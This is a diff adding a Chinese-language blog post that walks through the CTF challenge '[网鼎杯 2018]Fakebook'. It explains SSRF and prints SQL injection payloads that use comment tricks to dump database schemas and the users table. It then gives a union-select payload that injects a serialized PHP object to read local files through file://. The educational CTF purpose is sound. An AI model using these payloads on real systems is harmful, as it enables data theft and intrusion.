@@ -1,0 +1,262 @@
+
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="utf-8" />
+    <title>[网鼎杯 2018]Fakebook | why</title>
+    <meta name="author" content="why" />
+    <meta name="description" content="" />
+    <meta name="keywords" content="" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
+    <link rel="icon" href="/images/avatar.jpg" />
+    <link rel="preconnect" href="https://s4.zstatic.net" />
+<script src="https://s4.zstatic.net/ajax/libs/vue/3.3.7/vue.global.prod.min.js"></script>
+<link rel="stylesheet" href="https://s4.zstatic.net/ajax/libs/font-awesome/6.4.2/css/all.min.css" />
+<link rel="preconnect" href="https://fonts.loli.net" />
+<link rel="preconnect" href="https://gstatic.loli.net" crossorigin />
+<link rel="stylesheet" href="https://fonts.loli.net/css2?family=Fira+Code:wght@400;500;600;700&family=Lexend:wght@400;500;600;700;800;900&family=Noto+Sans+SC:wght@400;500;600;700;800;900&display=swap" />
+<script> const mixins = {}; </script>
+
+<script src="https://polyfill.io/v3/polyfill.min.js?features=default"></script>
+
+
+<script src="https://s4.zstatic.net/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
+<script src="https://s4.zstatic.net/ajax/libs/highlightjs-line-numbers.js/2.8.0/highlightjs-line-numbers.min.js"></script>
+<link
+    rel="stylesheet"
+    href="https://s4.zstatic.net/ajax/libs/highlight.js/11.9.0/styles/github.min.css"
+/>
+<script src="/js/lib/highlight.js"></script>
+
+
+
+<script src="/js/lib/preview.js"></script>
+
+
+
+
+
+
+
+
+
+<link rel="stylesheet" href="/css/main.css" />
+
+<meta name="generator" content="Hexo 7.1.1"></head>
+<body>
+    <div id="layout">
+        <transition name="fade">
+            <div id="loading" v-show="loading">
+                <div id="loading-circle">
+                    <h2>LOADING</h2>
+                    <p>加载过慢请开启缓存 浏览器默认开启</p>
+                    <img src="/images/loading.gif" />
+                </div>
+            </div>
+        </transition>
+        <div id="menu" :class="{ hidden: hiddenMenu, 'menu-color': menuColor}">
+    <nav id="desktop-menu">
+        <a class="title" href="/">
+            <span>WHY</span>
+        </a>
+        
+        <a href="/">
+            <i class="fa-solid fa-house fa-fw"></i>
+            <span>&ensp;Home</span>
+        </a>
+        
+        <a href="/about">
+            <i class="fa-solid fa-id-card fa-fw"></i>
+            <span>&ensp;About</span>
+        </a>
+        
+        <a href="/archives">
+            <i class="fa-solid fa-box-archive fa-fw"></i>
+            <span>&ensp;Archives</span>
+        </a>
+        
+        <a href="/categories">
+            <i class="fa-solid fa-bookmark fa-fw"></i>
+            <span>&ensp;Categories</span>
+        </a>
+        
+        <a href="/tags">
+            <i class="fa-solid fa-tags fa-fw"></i>
+            <span>&ensp;Tags</span>
+        </a>
+        
+    </nav>
+    <nav id="mobile-menu">
+        <div class="title" @click="showMenuItems = !showMenuItems">
+            <i class="fa-solid fa-bars fa-fw"></i>
+            <span>&emsp;WHY</span>
+        </div>
+        <transition name="slide">
+            <div class="items" v-show="showMenuItems">
+                
+                <a href="/">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-house fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">Home</div>
+                    </div>
+                </a>
+                
+                <a href="/about">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-id-card fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">About</div>
+                    </div>
+                </a>
+                
+                <a href="/archives">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-box-archive fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">Archives</div>
+                    </div>
+                </a>
+                
+                <a href="/categories">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-bookmark fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">Categories</div>
+                    </div>
+                </a>
+                
+                <a href="/tags">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-tags fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">Tags</div>
+                    </div>
+                </a>
+                
+            </div>
+        </transition>
+    </nav>
+</div>
+<transition name="fade">
+    <div id="menu-curtain" @click="showMenuItems = !showMenuItems" v-show="showMenuItems"></div>
+</transition>
+
+        <div id="main" :class="loading ? 'into-enter-from': 'into-enter-active'">
+            <div class="article">
+    <div>
+        <h1>[网鼎杯 2018]Fakebook</h1>
+    </div>
+    <div class="info">
+        <span class="date">
+            <span class="icon">
+                <i class="fa-solid fa-calendar fa-fw"></i>
+            </span>
+            2024/5/5
+        </span>
+        
+        
+    </div>
+    
+    <div class="content" v-pre>
+        <p><img src="C:\Users\汪涵裕\AppData\Roaming\Typora\typora-user-images\image-20240505030850620.png" alt="image-20240505030850620"></p>
+<p>发现有robots.txt可以打开</p>
+<p><img src="C:\Users\汪涵裕\AppData\Roaming\Typora\typora-user-images\image-20240505030918810.png" alt="image-20240505030918810"></p>
+<p>直接访问</p>
+<p>下载之后直接打开</p>
+<p><img src="C:\Users\汪涵裕\AppData\Roaming\Typora\typora-user-images\image-20240505031002440.png" alt="image-20240505031002440"></p>
+<p>get方法中，curl_exec()如果使用不当就会导致ssrf漏洞。有一点思路了，而我们在御剑扫到了flag.php。猜测可能flag.php处于内网</p>
+<h4 id="ssrf漏洞成因："><a href="#ssrf漏洞成因：" class="headerlink" title="ssrf漏洞成因："></a>ssrf漏洞成因：</h4><p>SSRF的形成大多是由于服务端提供了从其他服务器应用获取数据的功能且没有对目标地址做过滤与限制。例如，黑客操作服务端从指定URL地址获取网页文本内容，加载指定地址的图片等，利用的是服务端的请求伪造。SSRF利用存在缺陷的Web<br>应用作为代理攻击远程和本地的服务器。<br>主要攻击方式如下所示。</p>
+<ul>
+<li>对外网、服务器所在内网、本地进行端口扫描，获取一些服务的banner信息。</li>
+<li>攻击运行在内网或本地的应用程序。</li>
+<li>对内网Web应用进行指纹识别，识别企业内部的资产信息。</li>
+<li>攻击内外网的Web应用，主要是使用HTTP GET请求就可以实现的攻击(比如struts2、SQli等)。</li>
+<li>利用file协议读取本地文件等。</li>
+</ul>
+<p><a target="_blank" rel="noopener" href="http://payloads.net/ssrf.php?url=192.168.1.10:3306">http://payloads.net/ssrf.php?url=192.168.1.10:3306</a></p>
+<p><a target="_blank" rel="noopener" href="http://payloads.net/ssrf.php?url=file:///c:/windows/win.ini">http://payloads.net/ssrf.php?url=file:///c:/windows/win.ini</a></p>
+<h4 id="ssrf漏洞相关函数："><a href="#ssrf漏洞相关函数：" class="headerlink" title="ssrf漏洞相关函数："></a>ssrf漏洞相关函数：</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">file_get_contents()、fsockopen()、curl_exec()、fopen()、readfile()</span><br></pre></td></tr></table></figure>
+
+<p>所以在这里我们可以发现关于curl_exec函数的使用</p>
+<p>认定为ssrf漏洞</p>
+<p>ssrf访问的话可以使用伪协议</p>
+<p><em>file:&#x2F;&#x2F;var&#x2F;www&#x2F;html&#x2F;flag.php</em></p>
+<p>比较经典的var&#x2F;www&#x2F;html&#x2F;</p>
+<p><img src="C:\Users\汪涵裕\AppData\Roaming\Typora\typora-user-images\image-20240505150354978.png" alt="image-20240505150354978"></p>
+<p>apache的主要配置文件默认站点目录</p>
+<p>回到题目</p>
+<p>首先是先注册一个账号。之后进入用户界面发现no参数</p>
+<p>尝试一下1 or 1&#x3D;1–+</p>
+<p>是可以注入的，所以应该可以尝试SQL注入</p>
+<p>剩下的就是sql注入</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?no=1 order by 4`</span><br><span class="line"></span><br><span class="line">`?no=-1 union/**/select/**/1,2,3,4`</span><br><span class="line"></span><br><span class="line">`?no=-1 union/**/select/**/1,group_concat(schema_name),3,4/**/from/**/information_schema.schemata`</span><br><span class="line"></span><br><span class="line">`?no=-1 union/**/select/**/1,group_concat(table_name),3,4/**/from/**/information_schema.tables/**/where/**/table_schema=&#x27;fakebook&#x27;`</span><br><span class="line"></span><br><span class="line">`?no=-1 union/**/select/**/1,group_concat(column_name),3,4/**/from/**/information_schema.columns/**/where/**/table_name=&#x27;users&#x27;`</span><br><span class="line"></span><br><span class="line">`?no=-1 union/**/select/**/1,group_concat(no,&#x27;~&#x27;,username,&#x27;~&#x27;,passwd,&#x27;~&#x27;,data),3,4/**/from/**/fakebook.users</span><br></pre></td></tr></table></figure>
+
+<p>到这里都没什么问题</p>
+<p>过滤了空格但是可以&#x2F;**&#x2F;绕过，没什么大问题</p>
+<p>到最后，我们可以发现账户密码都无所谓因为都是自己设置的</p>
+<p>所以，接下来就是看data</p>
+<p>O:8:”UserInfo”:3:{s:4:”name”;s:5:”admin”;s:3:”age”;i:12;s:4:”blog”;s:8:”123.blog”;}</p>
+<p>根据注入可知，username是的二位。猜测data为第四个字段，所以我们可以尝试写入一些连接,通过反序列化的形式写入</p>
+<p>所以构建payload：</p>
+<p><code>?no=-1 union/**/select/**/1,2,3,&#39;O:8:&quot;UserInfo&quot;:3:&#123;s:4:&quot;name&quot;;s:5:&quot;mochu&quot;;s:3:&quot;age&quot;;i:7;s:4:&quot;blog&quot;;s:29:&quot;file:///var/www/html/flag.php&quot;;&#125;&#39;</code></p>
+<p>写入data字段</p>
+<p>在页面代码中发现一串base64编码</p>
+<p><img src="C:\Users\汪涵裕\AppData\Roaming\Typora\typora-user-images\image-20240505152212286.png" alt="image-20240505152212286"></p>
+<p>翻译一下</p>
+<p>找到flag</p>
+
+    </div>
+    
+    
+    
+    
+    
+    
+    
+</div>
+
+            <footer id="footer">
+    <div id="footer-wrap">
+        <div>
+            &copy;
+            2022 - 2024 why
+            <span id="footer-icon">
+                <i class="fa-solid fa-font-awesome fa-fw"></i>
+            </span>
+            &commat;why
+        </div>
+        <div>
+            Based on the <a target="_blank" rel="noopener" href="https://hexo.io">Hexo Engine</a> &amp;
+            <a target="_blank" rel="noopener" href="https://github.com/theme-particlex/hexo-theme-particlex">ParticleX Theme</a>
+        </div>
+        
+    </div>
+</footer>
+
+        </div>
+        
+        <transition name="fade">
+            <div id="preview" ref="preview" v-show="previewShow">
+                <img id="preview-content" ref="previewContent" />
+            </div>
+        </transition>
+        
+    </div>
+    <script src="/js/main.js"></script>
+    
+    
+
+
+
+
+    
+<script src="/js/<file>"></script>
+<link rel="stylesheet" href="/css/<file>" />
+</body>
+</html>
